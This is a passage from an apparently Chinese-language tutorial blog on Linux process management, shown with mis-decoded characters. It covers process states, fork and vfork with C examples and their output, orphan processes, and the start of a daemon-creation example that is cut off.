title="è¿›ç¨‹çŠ¶æ€"></a>è¿›ç¨‹çŠ¶æ€</h2><ul><li><p>è¿è¡ŒçŠ¶æ€Rï¼šè¿›ç¨‹æ­£åœ¨è¿è¡Œæˆ–åœ¨è¿è¡Œé˜Ÿåˆ—ä¸­ç­‰å¾…è¿è¡Œã€‚</p></li><li><p>å¯ä¸­æ–­ç­‰å¾…çŠ¶æ€Sï¼šè¿›ç¨‹æ­£åœ¨ç­‰å¾…æŸä¸ªäº‹ä»¶å®Œæˆï¼Œç­‰å¾…è¿‡ç¨‹ä¸­å¯ä»¥è¢«ä¿¡å·æˆ–å®šæ—¶å™¨å”¤é†’ã€‚</p></li><li><p>ä¸å¯ä¸­æ–­ç­‰å¾…çŠ¶æ€Dï¼šè¿›ç¨‹ä¹Ÿåœ¨ç­‰å¾…æŸä¸ªäº‹ä»¶å®Œæˆï¼Œåœ¨ç­‰å¾…ä¸­ä¸å¯ä»¥è¢«ä¿¡å·æˆ–å®šæ—¶å™¨å”¤é†’ï¼Œå¿…é¡»ç­‰å¾…ç›´åˆ°ç­‰å¾…çš„äº‹ä»¶å‘ç”Ÿã€‚</p></li><li><p>åƒµæ­»çŠ¶æ€Zï¼šè¿›ç¨‹å·²ç»ˆæ­¢ï¼Œä½†è¿›ç¨‹æè¿°ç¬¦ä¾ç„¶å­˜åœ¨ï¼Œç›´åˆ°çˆ¶è¿›ç¨‹è°ƒç”¨<code>wait()</code>å‡½æ•°åé‡Šæ”¾ã€‚</p></li><li><p>åœæ­¢çŠ¶æ€Tï¼šè¿›ç¨‹å› ä¸ºæ”¶åˆ°SIGSTOPã€SIGSTPã€SIGTINã€SIGTOUä¿¡å·ååœæ­¢è¿è¡Œæˆ–è€…è¯¥è¿›ç¨‹æ­£åœ¨è¢«è·Ÿè¸ª(è°ƒè¯•ç¨‹åºæ—¶ï¼Œè¿›ç¨‹å¤„äºè¢«è·Ÿè¸ªçŠ¶æ€)ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1xPyXFRpqbWCT3w.png" alt="image-20210206223438106"></p></li></ul><p>è¿è¡Œæ—¶è¿˜ä¼šæœ‰ä¸€äº›åç¼€å­—ç¬¦ï¼Œå…¶æ„ä¹‰åˆ†åˆ«ä¸º&lt;(é«˜ä¼˜å…ˆçº§è¿›ç¨‹),N(ä½ä¼˜å…ˆçº§é˜Ÿåˆ—),L(å†…å­˜é”é¡µï¼Œå³é¡µä¸å¯ä»¥è¢«æ¢å‡ºå†…å­˜),s(è¯¥è¿›ç¨‹ä¸ºä¼šè¯é¦–è¿›ç¨‹),l(å¤šçº¿ç¨‹è¿›ç¨‹),+(è¿›ç¨‹ä½äºå‰å°è¿›ç¨‹ç»„)ã€‚</p><h2 id="è¿›ç¨‹æ§åˆ¶"><a href="#è¿›ç¨‹æ§åˆ¶" class="headerlink" title="è¿›ç¨‹æ§åˆ¶"></a>è¿›ç¨‹æ§åˆ¶</h2><p>Linuxè¿›ç¨‹æ§åˆ¶åŒ…æ‹¬åˆ›å»ºè¿›ç¨‹ã€æ‰§è¡Œæ–°ç¨‹åºã€é€€å‡ºè¿›ç¨‹åŠæ”¹å˜è¿›ç¨‹ä¼˜å…ˆçº§ç­‰ã€‚</p><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç”¨äºå¯¹è¿›ç¨‹è¿›è¡Œæ§åˆ¶çš„ä¸»è¦ç³»ç»Ÿè°ƒç”¨ä»¥ä¸‹æ‰€ç¤º:</p><ul><li>forkï¼šç”¨äºåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹</li><li>exitï¼šç”¨äºç»ˆæ­¢è¿›ç¨‹</li><li>execï¼šç”¨äºæ‰§è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åº</li><li>waitï¼šå°†çˆ¶è¿›ç¨‹æŒ‚èµ·ï¼Œç­‰å¾…å­è¿›ç¨‹ç»ˆæ­¢</li><li>getpidï¼š è·å–å½“å‰è¿›ç¨‹çš„ID</li><li>niceï¼š æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§</li></ul><h1 id="è¿›ç¨‹æ“ä½œ"><a href="#è¿›ç¨‹æ“ä½œ" class="headerlink" title="è¿›ç¨‹æ“ä½œ"></a>è¿›ç¨‹æ“ä½œ</h1><h2 id="åˆ›å»ºè¿›ç¨‹"><a href="#åˆ›å»ºè¿›ç¨‹" class="headerlink" title="åˆ›å»ºè¿›ç¨‹"></a>åˆ›å»ºè¿›ç¨‹</h2><h3 id="æ–¹å¼"><a href="#æ–¹å¼" class="headerlink" title="æ–¹å¼"></a>æ–¹å¼</h3><p>åˆ›å»ºè¿›ç¨‹æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ç”±æ“ä½œç³»ç»Ÿåˆ›å»ºï¼ŒäºŒæ˜¯ç”±çˆ¶è¿›ç¨‹åˆ›å»ºã€‚</p><p>ç”±æ“ä½œç³»ç»Ÿåˆ›å»ºçš„è¿›ç¨‹ã€‚å®ƒä»¬æ˜¯å¹³ç­‰çš„ï¼Œä¸å­˜åœ¨èµ„æºç»§æ‰¿å…³ç³»ã€‚è€Œå¯¹äºçˆ¶è¿›ç¨‹åˆ›å»ºçš„è¿›ç¨‹ä»–ä»¬å’Œçˆ¶è¿›ç¨‹å­˜åœ¨éš¶å±å…³ç³»ã€‚å­è¿›ç¨‹åˆå¯ä»¥åˆ›å»ºè¿›ç¨‹ï¼Œè¿™æ ·å½¢æˆäº†ä¸€ä¸ªè¿›ç¨‹å®¶æ—ã€‚å­è¿›ç¨‹å¯ä»¥ç»§æ‰¿å…¶çˆ¶è¿›ç¨‹å‡ ä¹æ‰€æœ‰çš„èµ„æºã€‚åœ¨ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ä¼šï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ›å»ºä¸€äº›è¿›ç¨‹ï¼Œå®ƒä»¬æ‰¿æ‹…ç€ç®¡ç†å’Œåˆ†é…ç³»ç»Ÿèµ„æºçš„ä»»åŠ¡ï¼Œè¿™äº›è¿›ç¨‹é€šå¸¸è¢«ç§°ä¸ºç³»ç»Ÿè¿›ç¨‹ã€‚</p><blockquote><p>ç³»ç»Ÿè°ƒç”¨<code>fork</code>æ˜¯åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹çš„å”¯ä¸€æ–¹æ³•ï¼Œé™¤äº†æå°‘æ•°çš„æ–¹å¼åˆ›å»ºçš„è¿›ç¨‹ï¼Œå¦‚<code>init</code>è¿›ç¨‹ï¼Œå®ƒæ˜¯å†…æ ¸å¯åŠ¨æ—¶ä»¥ç‰¹æ®Šæ–¹å¼åˆ›å»ºçš„ã€‚è¿›ç¨‹è°ƒç”¨<code>fork</code>å‡½æ•°å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹ã€‚</p></blockquote><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><p><code>fork</code>å‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¼šè¿”å›ä¸¤ä¸ªå€¼ï¼Œå®é™…ä¸Šè°ƒç”¨æˆåŠŸåï¼Œå½“å‰è¿›ç¨‹åˆ†è£‚ä¸ºä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªæ˜¯åŸæ¥çš„çˆ¶è¿›ç¨‹ï¼Œå¦ä¸€ä¸ªæ˜¯åˆšåˆšåˆ›å»ºçš„å­è¿›ç¨‹ã€‚çˆ¶å­è¿›ç¨‹åœ¨è°ƒç”¨<code>fork</code>å‡½æ•°çš„åœ°æ–¹åˆ†å¼€ï¼Œ<code>fork</code>å‡½æ•°æœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°çš„çˆ¶è¿›ç¨‹è°ƒç”¨<code>fork</code>å‡½æ•°åçš„è¿”å›å€¼ï¼Œè¿™ä¸ªè¿”å›å€¼æ˜¯åˆšåˆšåˆ›å»ºçš„å­è¿›ç¨‹çš„IDï¼Œå¦ä¸€ä¸ªæ˜¯å­è¿›ç¨‹ä¸­<code>fork</code>å‡½æ•°çš„è¿”å›å€¼ï¼Œè¿™ä¸ªè¿”å›å€¼æ˜¯0ã€‚<code>fork</code>å‡½æ•°è¿”å›ä¸¤ä¸ªå€¼çš„å‰ææ˜¯è¿›ç¨‹åˆ›å»ºæˆåŠŸï¼Œï¼Œå¦‚æœå¤±è´¥åªä¼šè¿”å›-1ã€‚</p><p>ä¾‹å¦‚ <code>fork.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> fpid; <span class="comment">//fpidè¡¨ç¤ºforkå‡½æ•°çš„è¿”å›å€¼</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    fpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (fpid &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error in fork!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the child process, my process id is %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æˆ‘æ˜¯çˆ¹çš„å„¿å­\n&quot;</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent process, my process id is %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æˆ‘æ˜¯å­©å­ä»–çˆ¹\n&quot;</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ç»Ÿè®¡ç»“æœæ˜¯: %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wyw@linux:~/linux_c$ ./fork</span><br><span class="line">I am the parent process, my process id is 36738</span><br><span class="line">æˆ‘æ˜¯å­©å­ä»–çˆ¹</span><br><span class="line">ç»Ÿè®¡ç»“æœæ˜¯: 1</span><br><span class="line">I am the child process, my process id is 36739</span><br><span class="line">æˆ‘æ˜¯çˆ¹çš„å„¿å­</span><br><span class="line">ç»Ÿè®¡ç»“æœæ˜¯: 1</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šç”¨ <code>fork</code> åˆ›å»ºå­è¿›ç¨‹åï¼Œçˆ¶å­è¿›ç¨‹çš„æ‰§è¡Œé¡ºåºæ˜¯ä¸ç¡®å®šçš„ã€‚</p></blockquote><p><strong>å±æ€§ç»§æ‰¿</strong></p><p><code>fork</code>åˆ›å»ºçš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¾ˆå¤šå±æ€§ï¼Œä¸»è¦åŒ…æ‹¬ç”¨æˆ·IDã€ç»„IDã€å½“å‰å·¥ä½œç›®å½•ã€æ ¹ç›®å½•ã€æ‰“å¼€çš„æ–‡ä»¶ã€åˆ›å»ºçš„æ–‡ä»¶ä½¿ç”¨çš„å±è”½å­—ã€ä¿¡å·å±è”½å­ã€ä¸Šä¸‹æ–‡ç¯å¢ƒã€å…±äº«å­˜å‚¨æ®µã€èµ„æºé™åˆ¶ç­‰ã€‚</p><h3 id="å­¤å„¿è¿›ç¨‹"><a href="#å­¤å„¿è¿›ç¨‹" class="headerlink" title="å­¤å„¿è¿›ç¨‹"></a>å­¤å„¿è¿›ç¨‹</h3><p>å­¤å„¿è¿›ç¨‹å°±æ˜¯ä¸€ä¸ªå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å…ˆäºå­è¿›ç¨‹ç»“æŸï¼Œå­è¿›ç¨‹å°±æˆä¸ºäº†ä¸€ä¸ªå­¤å„¿è¿›ç¨‹ï¼Œå®ƒç”±<code>init</code>è¿›ç¨‹æ”¶å…»ï¼Œæˆä¸ºinitè¿›ç¨‹çš„å­è¿›ç¨‹ã€‚</p><h3 id="vforkå‡½æ•°"><a href="#vforkå‡½æ•°" class="headerlink" title="vforkå‡½æ•°"></a>vforkå‡½æ•°</h3><p><code>vfork</code>ä¹Ÿå¯ä»¥åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä¸<code>fork</code>ç›¸æ¯”ï¼Œå®ƒæœ‰è‡ªå·±ç‹¬ç‰¹çš„ç”¨å¤„ã€‚</p><ul><li><code>vfork</code>å’Œ<code>fork</code>ä¸€æ ·éƒ½æ˜¯è°ƒç”¨ä¸€æ¬¡ï¼Œè¿”å›ä¸¤æ¬¡ã€‚</li><li>ä½¿ç”¨<code>fork</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå­è¿›ç¨‹åªæ˜¯å®Œå…¨å¤åˆ¶çˆ¶è¿›ç¨‹çš„èµ„æºã€‚è¿™æ ·å¾—åˆ°çš„å­è¿›ç¨‹ç‹¬ç«‹äºçˆ¶è¿›ç¨‹ï¼Œå¹¶å…·æœ‰è‰¯å¥½çš„å¹¶å‘è¡Œã€‚è€Œä½¿ç”¨<code>vfork</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¹¶ä¸å°†çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´å®Œå…¨å¤åˆ¶åˆ°å­è¿›ç¨‹ï¼Œç”¨<code>vfork</code>åˆ›å»ºçš„å­è¿›ç¨‹å…±äº«çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯å­è¿›ç¨‹å®Œå…¨è¿è¡Œåœ¨çˆ¶è¿›ç¨‹åœ°å€ç©ºé—´ä¸Šï¼Œå­è¿›ç¨‹å¯¹åœ°å€ç©ºé—´ä»»ä½•ä¿®æ”¹å¯¹çˆ¶è¿›ç¨‹éƒ½æ˜¯å¯è§çš„ã€‚</li><li><code>fork</code>åˆ›å»ºçš„å­è¿›ç¨‹ï¼Œå“ªä¸ªè¿›ç¨‹å…ˆè¿è¡Œå–å†³äºç³»ç»Ÿçš„è°ƒåº¦ç®—æ³•ï¼Œä½†æ˜¯<code>vfork</code>ä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œä¿è¯å­è¿›ç¨‹å…ˆè¿è¡Œï¼Œå½“ä»–è°ƒç”¨<code>exec</code>æˆ–è€…<code>exit</code>ä¹‹åï¼Œçˆ¶è¿›ç¨‹æ‰å¯èƒ½è¢«è°ƒåº¦è¿è¡Œã€‚å¦‚æœåœ¨<code>exiec</code>æˆ–è€…<code>exit</code>ä¹‹å‰è¦ä¾èµ–çˆ¶è¿›ç¨‹çš„æŸä¸ªè¡Œä¸ºï¼Œå°±ä¼šå¯¼è‡´æ­»é”ã€‚</li><li>åŒæ—¶<code>fork</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ‰€æœ‰çˆ¶è¿›ç¨‹çš„èµ„æºéƒ½è¦å¤åˆ¶ï¼Œæœ‰æ—¶å€™å­è¿›ç¨‹åªæ˜¯è°ƒç”¨ä¸€ä¸ª<code>exec</code>ï¼Œæ‰€ä»¥è¿™æ ·ä¼šæµªè´¹å¤§é‡çš„ç³»ç»Ÿèµ„æºã€‚è€Œ<code>vfork</code> ä¸ä¼šæ‹·è´çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œè¿™æ ·å‡å°äº†ç³»ç»Ÿå¼€é”€ã€‚</li></ul><p>ä¾‹å¦‚ï¼š<code>vfork.c</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">pid = vfork();<span class="comment">// åˆ›å»ºè¿›ç¨‹</span></span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123; <span class="comment">// å‡ºé”™</span></span><br><span class="line">perror(<span class="string">&quot;vfork&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == pid)&#123; <span class="comment">// å­è¿›ç¨‹</span></span><br><span class="line">sleep(<span class="number">3</span>); <span class="comment">// å»¶æ—¶ 3 ç§’</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am son\n&quot;</span>);</span><br><span class="line">        a = <span class="number">100</span>, b = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;son: a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">_exit(<span class="number">0</span>); <span class="comment">// é€€å‡ºå­è¿›ç¨‹ï¼Œå¿…é¡»</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123; <span class="comment">// çˆ¶è¿›ç¨‹</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am father\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;father: a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wyw@linux:~/linux_c$ ./vfork</span><br><span class="line">i am son</span><br><span class="line">son: a = 100, b = 200</span><br><span class="line">i am father</span><br><span class="line">father: a = 100, b = 200</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼šä¸Šé¢çš„ä»£ç ï¼Œå·²ç»è®©å­è¿›ç¨‹å»¶æ—¶ 3 sï¼Œ ç»“æœè¿˜æ˜¯å­è¿›ç¨‹è¿è¡Œç»“æŸåï¼Œçˆ¶è¿›ç¨‹æ‰æ‰§è¡Œã€‚</p><p>å­è¿›ç¨‹ä¿®æ”¹ a, b çš„å€¼ï¼Œä¼šå½±å“åˆ°çˆ¶è¿›ç¨‹çš„ a, b, </p><blockquote><p>æ³¨æ„ï¼šç”¨ vfork() åˆ›å»ºè¿›ç¨‹ï¼Œå­è¿›ç¨‹é‡Œä¸€å®šè¦è°ƒç”¨ execï¼ˆè¿›ç¨‹æ›¿æ¢ï¼‰ æˆ– exitï¼ˆé€€å‡ºè¿›ç¨‹ï¼‰ï¼Œå¦åˆ™ï¼Œç¨‹åºä¼šå‡ºé—®é¢˜ï¼Œæ²¡æœ‰æ„ä¹‰ã€‚</p></blockquote><h2 id="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹"><a href="#åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹"></a>åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹</h2><p>å®ˆæŠ¤è¿›ç¨‹(daemon)æ˜¯æŒ‡åœ¨åå°è¿è¡Œçš„ã€æ²¡æœ‰æ§åˆ¶ç»ˆç«¯ä¸ä¹‹ç›¸è¿çš„è¿›ç¨‹ã€‚ä»–ç‹¬ç«‹äºæ§åˆ¶ç»ˆç«¯ï¼Œé€šå¸¸å‘¨æœŸæ€§åœ°æ‰§è¡ŒæŸç§ä»»åŠ¡ã€‚Linuxå¤§å¤šæ•°æœåŠ¡å™¨å°±æ˜¯ç”¨å®ˆæŠ¤è¿›ç¨‹æ–¹å¼å®ç°çš„ï¼Œç±»ä¼¼windowsçš„ç³»ç»ŸæœåŠ¡ã€‚</p><blockquote><p>ä¼šè¯å’Œè¿›ç¨‹ç»„</p><p>è¿›ç¨‹ç»„æ˜¯ä¸€ç»„ç›¸å…³è¿›ç¨‹çš„é›†åˆï¼Œä¼šè¯æ˜¯ä¸€ç»„ç›¸å…³è¿›ç¨‹ç»„çš„é›†åˆã€‚</p><p>å½“æœ‰æ–°çš„ç”¨æˆ·ç™»å½•Linuxæ—¶ï¼Œç™»å½•è¿›ç¨‹ä¼šä¸ºè¿™ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªä¼šè¯ã€‚ç”¨æˆ·çš„ç™»å½•shellå°±æ˜¯ä¼šè¯çš„é¦–è¿›ç¨‹ã€‚ä¼šè¯çš„é¦–è¿›ç¨‹IDä¼šä½œä¸ºæ•´ä¸ªä¼šè¯çš„IDã€‚ä¼šè¯æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ç»„çš„é›†åˆï¼Œå›Šæ‹¬äº†ç™»å½•ç”¨æˆ·çš„æ‰€æœ‰æ´»åŠ¨ã€‚åœ¨ç™»å½•shellæ—¶ï¼Œç”¨æˆ·å¯èƒ½ä¼šä½¿ç”¨ç®¡é“ï¼Œè®©å¤šä¸ªè¿›ç¨‹äº’ç›¸é…åˆå®Œæˆä¸€é¡¹å·¥ä½œï¼Œè¿™ä¸€ç»„è¿›ç¨‹å±äºåŒä¸€ä¸ªè¿›ç¨‹ç»„ã€‚</p><p>é€šå¸¸ï¼Œä¼šè¯å¼€å§‹äºç”¨æˆ·ç™»å½•ï¼Œç»ˆæ­¢äºç”¨æˆ·é€€å‡ºï¼ŒæœŸé—´çš„æ‰€æœ‰è¿›ç¨‹éƒ½å±äºè¿™ä¸ªä¼šè¯ã€‚ä¸€ä¸ªä¼šè¯ä¸€èˆ¬åŒ…å«ä¸€ä¸ªä¼šè¯é¦–è¿›ç¨‹ã€ä¸€ä¸ªå‰å°è¿›ç¨‹ç»„å’Œä¸€ä¸ªåå°è¿›ç¨‹ç»„ï¼Œæ§åˆ¶ç»ˆç«¯å¯æœ‰å¯æ— ï¼›æ­¤å¤–ï¼Œå‰å°è¿›ç¨‹ç»„åªæœ‰ä¸€ä¸ªï¼Œåå°è¿›ç¨‹ç»„å¯ä»¥æœ‰å¤šä¸ªï¼Œè¿™äº›è¿›ç¨‹ç»„å…±äº«ä¸€ä¸ªæ§åˆ¶ç»ˆç«¯ã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/JjZqQIen5hOfRzm.png" alt="image-20210207211130893"></p><p>åˆ›å»ºæ­¥éª¤ï¼š</p><ul><li>fork()åˆ›å»ºå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹exit()é€€å‡º</li><li>åœ¨å­è¿›ç¨‹è°ƒç”¨setsid()åˆ›å»ºæ–°ä¼šè¯</li><li>å†æ¬¡ fork() ä¸€ä¸ªå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹exité€€å‡º</li><li>åœ¨å­è¿›ç¨‹ä¸­è°ƒç”¨chdir()è®©æ ¹ç›®å½•â€œ/â€æˆä¸ºå­è¿›ç¨‹çš„å·¥ä½œç›®å½•</li><li>åœ¨å­è¿›ç¨‹ä¸­è°ƒç”¨umask()é‡è®¾æ–‡ä»¶æƒé™æ©ç ä¸º0</li><li>åœ¨å­è¿›ç¨‹ä¸­è°ƒç”¨close()å…³é—­ä¸éœ€è¦çš„æ–‡ä»¶æè¿°ç¬¦</li><li>å®ˆæŠ¤è¿›ç¨‹é€€å‡ºå¤„ç†</li></ul><p>ä¾‹å¦‚ï¼š<code>daemon.c</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syslog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/param.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_daemon</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">int</span> pid; </span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1ï¼‰å±è”½ä¸€äº›æ§åˆ¶ç»ˆç«¯æ“ä½œçš„ä¿¡å·</span></span><br><span class="line">signal(SIGTTOU,SIG_IGN); </span><br><span class="line">signal(SIGTTIN,SIG_IGN); </span><br><span 